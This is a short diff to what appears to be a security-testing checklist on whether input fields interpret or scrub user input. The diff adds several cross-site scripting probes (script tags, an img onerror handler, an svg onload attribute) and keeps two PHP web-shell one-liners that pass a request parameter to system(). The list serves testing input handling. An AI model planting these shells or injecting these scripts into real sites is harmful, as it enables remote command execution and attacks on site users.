@@ -225,14 +225,17 @@ Input fields - Interpreted or Scrubbed?
 aaaaaaaaaaaaaaaaa... 
 hello " ; < >
  < > ' " { } ;  
-<script>alert();</script> 
-<ScRiPt>alert();</ScRiPt>  
+<script>alert(1);</script>
+<ScRiPt>alert(1);</ScRiPt>
+"><script>alert(1)</script>
+<img src="x" onerror="alert(1);">
+<svg/onload = alert(1);>
 <?php echo('Hello World'); ?>
-<?php system($_GET["cmd"]); ?>  
-<?php echo system($_REQUEST ["cmd"]); ?> 
+<?php system($_GET["cmd"]); ?>
+<?php echo system($_REQUEST ["cmd"]); ?>
 (function(){ 
-   return 2+2; 
-})(); 
+   return 2+2;
+})();
 
 
 =================================== 
